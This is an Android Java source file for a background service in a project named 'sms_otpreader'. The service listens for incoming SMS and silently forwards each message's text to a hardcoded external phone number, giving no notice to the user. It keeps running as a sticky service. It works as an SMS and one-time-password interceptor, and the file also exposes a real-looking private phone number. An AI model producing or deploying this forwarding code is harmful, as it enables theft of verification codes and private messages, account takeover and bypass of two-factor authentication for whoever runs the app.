package com.project.bijug.sms_otpreader;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Created by bijug on 27-11-2017.
 */

public class SmsService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.d("Start",intent.getStringExtra("name"));

        SmsReceiver.bindListener(new SmsListener() {
            @Override
            public void messageReceived(String messageText) {

                Log.d("Message",messageText);

                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage("+919629036780", null, messageText, null, null);
                    Log.d("SMS Status","SMS Sent");
                } catch (Exception e) {
                    Log.e("SMS Error","SMS Failed, Check it Later");
                    e.printStackTrace();
                }

            }
        });
        return START_STICKY;   //return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
